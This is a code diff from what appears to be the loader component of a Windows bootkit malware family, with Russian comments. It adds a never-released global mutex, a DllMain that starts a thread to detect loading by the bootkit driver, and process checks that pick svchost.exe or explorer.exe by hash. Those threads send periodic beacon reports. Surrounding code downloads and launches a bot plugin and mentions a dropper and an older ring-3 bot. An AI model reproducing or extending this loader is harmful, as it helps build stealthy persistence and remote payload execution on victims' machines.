@@ -10,6 +10,8 @@
 #include "DriverConnect.h"
 
 #include "DbgRpt.h"
+#include "Utils.h"
+
 
 
 
@@ -23,10 +25,55 @@ namespace LDRDEBGTEMPLATES
 
 #define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>
 
+PCHAR MakeMachineID();
+
+bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
+{
+	CHAR mutex_name[200];
+
+	m_memset(mutex_name, 0, sizeof(mutex_name));
+
+	PCHAR machine_id = MakeMachineID();
+	m_lstrcat(mutex_name, "Global\\");
+	m_lstrcat(mutex_name, MutexPrefix);
+	m_lstrcat(mutex_name, machine_id);
+
+	STR::Free(machine_id);
+
+	LDRDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);
+
+	SECURITY_ATTRIBUTES sa;
+	SECURITY_DESCRIPTOR sd;
+
+	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
+
+	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
+	sa.lpSecurityDescriptor = &sd;
+	sa.bInheritHandle = FALSE;
+
+	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
+	if (mutex_handle == NULL) return false;
+
+	// Catch ownership of mutex and never release
+	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
+	if (wait_result == WAIT_OBJECT_0) return true;
+
+	pCloseHandle(mutex_handle);
+	return false;
+}
+
 
 void DbgRptSvchostThread(void* Arguments)
 {
-	LDRDBG("DbgRptSvchostThread", "Sleeping before network started (3 min)...");
+	LDRDBG("DbgRptSvchostThread", "Try to catch host level svchost mutex.");
+	if (!TryToCatchHostLevelInstanceMutex("sv"))
+	{
+		LDRDBG("DbgRptSvchostThread", "Svchost mutex already catched by another process. Finishing.");
+		return;
+	}
+	
+	LDRDBG("DbgRptSvchostThread", "Svchost mutex catched successfully.Sleeping before network started (3 min)...");
 	pSleep(3 * 60 * 1000);
 
 	for(;;)
@@ -38,12 +85,22 @@ void DbgRptSvchostThread(void* Arguments)
 
 		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
 
+		LDRDBG("DbgRptSvchostThread", "Sleeping 3 min after report...");
 		pSleep(3 * 60 * 1000);
 	}
 }
 
 void DbgRptExplorerThread(void* Arguments)
 {
+	LDRDBG("DbgRptExplorerThread", "Try to catch host level explorer mutex.");
+	if (!TryToCatchHostLevelInstanceMutex("ex"))
+	{
+		LDRDBG("DbgRptExplorerThread", "Explorer mutex already catched by another process. Finishing.");
+		return;
+	}
+	
+	LDRDBG("DbgRptExplorerThread", "Explorer mutex catched successfully.");
+
 	for(;;)
 	{
 		LDRDBG("DbgRptExplorerThread", "Notify debug report...");
@@ -51,6 +108,7 @@ void DbgRptExplorerThread(void* Arguments)
 		// 305_ld постоянная работа в Explorer (каждые 3 минуты)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));
 
+		LDRDBG("DbgRptExplorerThread", "Sleeping 3 min after report...");
 		pSleep(3 * 60 * 1000);
 	}
 }
@@ -438,11 +496,27 @@ DWORD WINAPI ExplorerStartProc(LPVOID Data)
 }
 //------------------------------------------------------------------------
 
+// If dll loader call any of exported function, it resets this variable to FALSE.
+// So this action allows to avoid interference with our driver.
+BOOL IsLoadedByOriginalBootkitLoader = TRUE;
+
+bool IsDllLoadedByBootkitLoader()
+{
+	return (IsLoadedByOriginalBootkitLoader == TRUE);
+}
+
+void ResetBootkitLoaderFlag()
+{
+	IsLoadedByOriginalBootkitLoader = FALSE;
+}
+
 extern"C" __declspec(dllexport) VOID NTAPI  Start(
 							PVOID  NormalContext /*системный указатель*/,
 							PUSER_INIT_NOTIFY  SystemArgument1 /*аргумент который нужно сохранить чтоб использовать общение с драйвером*/,
 							PVOID SystemArgument2/* ничего не передаеться*/)
 {
+	ResetBootkitLoaderFlag();
+	
 	// стартуем поток загрузки длл 
 	if (SystemArgument1 == NULL)
 		return;
@@ -481,6 +555,54 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 		StartThread(ExplorerStartProc, SystemArgument1);
 	}
 };
+
+void StartBootkitPinger(void* Arguments)
+{
+	DWORD timeout = 10 * 1000;
+
+	// определяем в каком процессе находимся
+	char Name[MAX_PATH];
+	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;
+
+	PCHAR ShortName = File::ExtractFileNameA(Name, false);
+
+	DWORD Hash = STR::GetHash(ShortName, 0, true);
+
+	// If Dll loaded by original Bootkit driver we MUST wait some timeout.
+	// This happens because by default bootkit driver call DllMain(_, DLL_PROCESS_ATTACH, _)
+	// at all.
+	// Waiting helps system to load all libraries in default load order. After loading all modules 
+	// we can apply GetApi for our reasons.
+
+	LDRDBG("StartBootkitPinger", "LoaderDll loaded in path='%s' pid=%u... Sleeping %d sec.", Name, pGetProcessId(), 
+		timeout);
+	
+	pSleep(timeout);
+
+	LDRDBG("StartBootkitPinger", "LoaderDll wake up and check IsLoadedByOriginalBootkit=%d", IsDllLoadedByBootkitLoader());
+	if (!IsDllLoadedByBootkitLoader())
+	{
+		LDRDBG("StartBootkitPinger", "LoaderDll is NOT loaded by Bootkit loader. Finished.");
+		return;
+	}
+
+	LDRDBG("StartBootkitPinger", "LoaderDll detects original bootkit loading.");
+	
+	if (Hash == 0x2608DF01 /* svchost.exe */)
+	{
+		LDRDBG("StartBootkitPinger", "LoaderDll loaded in SVCHOST. ");
+		StartThread(DbgRptSvchostThread, NULL);
+	}
+	
+	if (Hash == 0x490A0972 /* explorer.exe */)
+	{
+		LDRDBG("StartBootkitPinger", "LoaderDll loaded in EXPLORER. ");
+		StartThread(DbgRptExplorerThread, NULL);
+	}
+	
+	LDRDBG("StartBootkitPinger", "finished.");
+}
+
 
 PCHAR GetBootkitSignalFileName()
 {
@@ -543,14 +665,19 @@ void WaitForOldRing3BotSelfRemoved()
 
 BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 {
+	ResetBootkitLoaderFlag();
+
 	DWORD Size = 0;
 	LPVOID Module = NULL;
 
 	//Загружаем библиотеку
-	LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
+	LDRDBG("LoadPlugToCache", "Делаем отзвон о начале загрузки.");
 
 	// 315_ld начало загрузки файла плага методом LoadPlugToCache
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
+
+	//Загружаем библиотеку
+	LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
 
 	Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);
 
@@ -578,6 +705,8 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 
 void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
 {
+	ResetBootkitLoaderFlag();
+
 	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
 	
 	DWORD DllBodySize;
@@ -618,10 +747,15 @@ void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
 
 #pragma comment(linker, "/ENTRY:LoaderDllMain" )
 
-DWORD WINAPI LoaderDllMain(DWORD, DWORD, DWORD)
+DWORD WINAPI LoaderDllMain(HINSTANCE , DWORD reason, LPVOID )
 {
+	LDRDBG("LoaderDllMain", "called with reason=%d", reason);
+	if (reason == DLL_PROCESS_ATTACH)
+	{
+		StartThread(StartBootkitPinger, NULL);
+	}
+
 	// В дропере загрузчик Дллки в память проверяет 
 	// возвращаемое значение. Поэтому ставим возвращать TRUE
-	//return 0;
 	return TRUE;
 }
